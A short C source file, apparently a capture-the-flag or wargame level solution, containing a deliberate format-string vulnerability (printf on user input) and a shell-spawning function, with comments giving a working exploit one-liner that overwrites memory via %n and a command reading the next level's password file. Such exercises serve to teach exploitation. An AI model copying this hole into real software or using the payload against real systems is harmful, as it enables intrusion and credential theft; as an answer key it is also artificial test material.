#include <stdio.h>
#include <stdlib.h>

void o(void)
{
    system("/bin/sh");
    _exit(1);
}

void n(void)
{
    char buf[520];

    fgets(buf, 512, stdin);
    printf(buf);
    exit(1);
}

// (python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' ; cat -) | /home/user/level5/level5
// cat /home/user/level6/.pass
int main(void)
{
    n();
    return 0;
}
